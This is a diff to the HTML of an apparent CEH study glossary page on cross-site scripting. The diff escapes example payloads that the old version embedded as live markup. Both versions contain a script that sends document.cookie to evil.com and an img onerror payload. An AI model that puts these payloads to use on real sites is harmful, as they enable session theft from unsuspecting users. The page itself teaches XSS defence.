@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <link rel="icon" type="image/png" href="/tiny_green_favicon_skull.png">
-    <title>Cross-Site Scripting (XSS) — Definition, Types & CEH Exam Guide | CEHStudy</title>
+    <title>Cross-Site Scripting (XSS) — Definition & CEH Guide | CEHStudy</title>
     <meta name="description" content="What is XSS? Complete guide to reflected, stored, and DOM-based cross-site scripting attacks. Learn XSS payloads, prevention techniques, and how it appears on the CEH v13 exam.">
     <meta name="keywords" content="cross-site scripting, XSS, reflected XSS, stored XSS, DOM-based XSS, XSS payload, XSS prevention">
     <meta name="robots" content="index, follow">
@@ -24,7 +24,7 @@
             "name": "CEH Study Glossary",
             "url": "https://cehstudy.com/glossary-terms/"
         },
-        "description": "Cross-Site Scripting (XSS) is a web security vulnerability that allows an attacker to inject malicious JavaScript or HTML into web pages viewed by other users. The injected script executes in the victim's browser with the victim's permissions, enabling session theft, data exfiltration, and account compromise."
+        "description": "Cross-Site Scripting (XSS) is a web security vulnerability that allows an attacker to inject malicious JavaScript or HTML into web pages viewed by other users. The injected script executes in the victim\u2019s browser with the victim\u2019s permissions, enabling session theft, data exfiltration, and account compromise."
     }
     </script>
     <script type="application/ld+json">
@@ -37,7 +37,7 @@
                 "name": "What is Cross-Site Scripting?",
                 "acceptedAnswer": {
                     "@type": "Answer",
-                    "text": "Cross-Site Scripting (XSS) is a web security vulnerability that allows an attacker to inject malicious JavaScript or HTML into web pages viewed by other users. The injected script executes in the victim's browser with the victim's permissions, enabling session theft, data exfiltration, and account compromise."
+                    "text": "Cross-Site Scripting (XSS) is a web security vulnerability that allows an attacker to inject malicious JavaScript or HTML into web pages viewed by other users. The injected script executes in the victim\u2019s browser with the victim\u2019s permissions, enabling session theft, data exfiltration, and account compromise."
                 }
             },
             {
@@ -97,7 +97,7 @@
 </head>
 <body>
     <header>
-        <a href="/"></> CEHStudy</a>
+        <a href="/">CEHStudy</a>
         <nav class="nav-links">
             <a href="/glossary-terms/">Glossary</a>
             <a href="/ceh-v13-study-guide/">Study Guide</a>
@@ -110,7 +110,7 @@
         <h1>Cross-Site Scripting</h1>
 
         <div class="definition-box">
-            <p>Cross-Site Scripting (XSS) is a web security vulnerability that allows an attacker to inject malicious JavaScript or HTML into web pages viewed by other users. The injected script executes in the victim's browser with the victim's permissions, enabling session theft, data exfiltration, and account compromise.</p>
+            <p>Cross-Site Scripting (XSS) is a web security vulnerability that allows an attacker to inject malicious JavaScript or HTML into web pages viewed by other users. The injected script executes in the victim\u2019s browser with the victim\u2019s permissions, enabling session theft, data exfiltration, and account compromise.</p>
         </div>
 
         <h2>Types & Variations</h2>
@@ -118,7 +118,7 @@
             <li>Reflected (Non-Persistent) XSS — Malicious script is injected via URL parameters or form fields and reflected in the response without sanitization</li>
             <li>Stored (Persistent) XSS — Malicious script is saved on the server (e.g., in a database via comments, profiles) and executes for every user who views the affected content</li>
             <li>DOM-based XSS — Exploits client-side DOM manipulation where unsanitized user input directly modifies the Document Object Model without a round-trip to the server</li>
-            <li>Mutation XSS (mXSS) — Exploits HTML sanitization by crafting payloads that pass validation but mutate into executable script in the browser's HTML parser</li>
+            <li>Mutation XSS (mXSS) — Exploits HTML sanitization by crafting payloads that pass validation but mutate into executable script in the browser\u2019s HTML parser</li>
         </ul>
 
         <h2>Common Tools & Techniques</h2>
@@ -131,9 +131,9 @@
         <p>Ethical hackers and security professionals use these tools in authorized penetration tests and red team operations. Unauthorized use is illegal under the Computer Fraud and Abuse Act (CFAA) and equivalent legislation worldwide.</p>
 
         <h2>Real-World Examples</h2>
-        <div class="example-box"><strong>Session Theft:</strong> <script>document.location="http://evil.com/?c="+document.cookie</script> — steals session cookie</div>
+        <div class="example-box"><strong>Session Theft:</strong> &lt;script&gt;document.location=&quot;http://evil.com/?c=&quot;+document.cookie&lt;/script&gt; — steals session cookie</div>
         <div class="example-box"><strong>DOM-based:</strong> Location hash passed to document.write() without sanitization creates an XSS sink</div>
-        <div class="example-box"><strong>Stored:</strong> A comment field containing <img src=x onerror=alert(document.cookie)> executes for every reader</div>
+        <div class="example-box"><strong>Stored:</strong> A comment field containing &lt;img src=x onerror=alert(document.cookie)&gt; executes for every reader</div>
 
         <h2>How Cross-Site Scripting Appears on the CEH v13 Exam</h2>
         <p>XSS is covered in CEH v13 Module 14 (Hacking Web Applications) and the OWASP Top 10. Exam questions test your ability to identify XSS vectors in code samples, distinguish between reflected/stored/DOM-based variants, understand browser security context (same-origin policy bypass via session cookies), and apply prevention measures like Content Security Policy (CSP) headers and output encoding.</p>
